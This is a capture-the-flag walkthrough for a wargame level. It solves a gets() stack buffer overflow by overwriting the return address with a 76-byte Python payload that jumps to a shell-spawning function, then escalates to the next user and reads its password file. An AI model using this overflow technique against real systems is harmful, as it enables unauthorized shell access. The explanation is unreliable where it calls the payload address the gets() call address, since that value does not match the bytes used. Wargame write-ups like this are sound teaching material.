# Walkthrough for level1

Just like level0, you use current level as login (so here : level1). The password is the flag from level0.

The checksec info is basically the same as level 0 :
```
  GCC stack protector support:            Enabled
  Strict user copy checks:                Disabled
  Restrict /dev/mem access:               Enabled
  Restrict /dev/kmem access:              Enabled
  grsecurity / PaX: No GRKERNSEC
  Kernel Heap Hardening: No KERNHEAP
 System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level1/level1



Let's use Ghidra...
There is a "main" function that allocates 76 bytes for an array of char and uses the call gets() on it, and also a "run" function that writes to stdout and opens a shell. Maybe we could use that to our advantage!

Using gdb to disassemble main(), we find that the call address for gets() is 0x8048340.
The idea is : let's overflow the array allocated in main in order to get to the run function and access the shell.
We want to write 76 characters, followed by the address called by gets(), so that we can open the shell. But there is stll an issue : if we call the binary, it will close the shell before we can write everything we need. A python command will be helpful here :
```python -c 'print "a" * 76 + "\x44\x84\x04\x08"' > /tmp/exploit```
then we pipe the result to the binary ```cat /tmp/exploit - | ./level1 ```, and check we got the right privileges with ```whoami```. If it says "level2", we can peek at the .pass file for the flag !

Now we can escalate to the next level : run ```su level2``` and use the flag as password.



Below is a string of 76 characters :
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
